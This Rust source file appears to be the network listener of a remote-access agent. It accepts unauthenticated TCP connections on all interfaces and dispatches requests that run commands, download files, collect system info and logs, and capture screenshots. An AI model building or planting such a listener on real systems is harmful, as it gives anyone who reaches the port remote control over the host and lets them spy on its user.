use log::{debug, error, info};
use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::thread;

use crate::communication::messages::{
    DownloadFileRequest, GetBasicInfoRequest, GetScreenshotResponse, Message, MessageBuffer,
    RunCommandRequest, MESSAGE_HEADER_LENGTH,
};
use crate::communication::serialization::{extract_msg_type_and_length, serialize_message};
use serde::Serialize;

use crate::actions::basic_info::{download_file_message, get_basic_info_request};
use crate::actions::commands::run_command_message;
use crate::actions::log_actions::get_logs_request;
use crate::actions::screenshot_actions::get_screenshot_request;

pub const BIND_ANY: &str = "0.0.0.0";

fn send_response(response: Message, mut stream: &TcpStream) -> Result<(), Error> {
    let response_buffer = serialize_message(response)?;
    debug!("Sending response buffer: {:?}", &response_buffer);
    stream.write_all(&response_buffer)?;
    Ok(())
}

fn handle_message(message_buffer: MessageBuffer, stream: &TcpStream) {
    let message: Message = ron::de::from_bytes(&message_buffer.serialized_message).unwrap();
    match message {
        Message::RunCommandRequest(rcr) => {
            //         let request: RunCommandRequest =
            //             ron::de::from_bytes(&message.serialized_message).unwrap();
            let response = run_command_message(rcr);
            let msg = Message::RunCommandResponse { 0: response };
            send_response(msg, stream).unwrap();
        }
        Message::DownloadFileRequest(dfr) => {
            let response = download_file_message(dfr);
            let msg = Message::DownloadFileResponse { 0: response };
            send_response(msg, stream).unwrap();
        }
        Message::GetBasicInfoRequest(bir) => {
            let response = get_basic_info_request();
            let msg = Message::GetBasicInfoResponse { 0: response };
            send_response(msg, stream).unwrap();
        }
        Message::GetLogsRequest(glr) => {
            let response = get_logs_request();
            let msg = Message::GetLogsResponse { 0: response };
            send_response(msg, stream).unwrap();
        }
        Message::GetScreenshotRequest(gsr) => {
            let response: GetScreenshotResponse = get_screenshot_request();
            let msg = Message::GetScreenshotResponse { 0: response };
            send_response(msg, stream).unwrap();
        }
        _ => error!("Unrecognized message type"),
    }
}

pub fn get_message(mut stream: &TcpStream) -> Result<MessageBuffer, Error> {
    let mut type_and_length = [0 as u8; MESSAGE_HEADER_LENGTH];
    match stream.read_exact(&mut type_and_length) {
        Ok(()) => {
            let (msg_type, msg_length) = extract_msg_type_and_length(type_and_length);
            let mut message = vec![0; msg_length];

            // Read_exact function guarantees that we will read exactly enough data to fill the buffer
            stream
                .read_exact(&mut message)
                .expect("Could not read message after getting message metadata. Error: {}");
            Ok(MessageBuffer {
                message_type: msg_type,
                serialized_message_length: msg_length,
                serialized_message: message,
            })
        }
        Err(e) => {
            error!(
                "An error occurred, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            Err(e)
        }
    }
}

pub fn handle_client(stream: TcpStream) -> Result<(), Error> {
    debug!("Handling connection from {}", stream.peer_addr()?);
    while match get_message(&stream) {
        Ok(message) => {
            handle_message(message, &stream);
            true
        }
        Err(e) => {
            error!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    } {}
    Ok(())
}

pub fn run_server(port: u16) -> Result<(), Error> {
    // If we can't open the server, it probably means:
    // - The port is already taken, or we are not running in sufficient permissions
    // - We treat both as recoverable errors, since if the port is not open now it might be open later.
    // - And, in addition, we have other ways to communicate so we should try them too instead of panicking.
    let listener = TcpListener::bind(format!("{}:{}", BIND_ANY, port))?;

    match listener.local_addr() {
        Ok(address) => {
            info!("Listening on: {:?}", address);
        }
        Err(e) => {
            error!("Error {} while trying to get local address.", &e);
        }
    };
    // accept connections and process them in a new thread
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                info!("New connection with: {}", stream.peer_addr()?);
                thread::spawn(move || {
                    // connection succeeded
                    // TODO what to do if this returns Error
                    handle_client(stream)
                });
            }
            Err(e) => {
                error!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
    // TODO handle this panic
    panic!("Server closed unexpectedly")
}
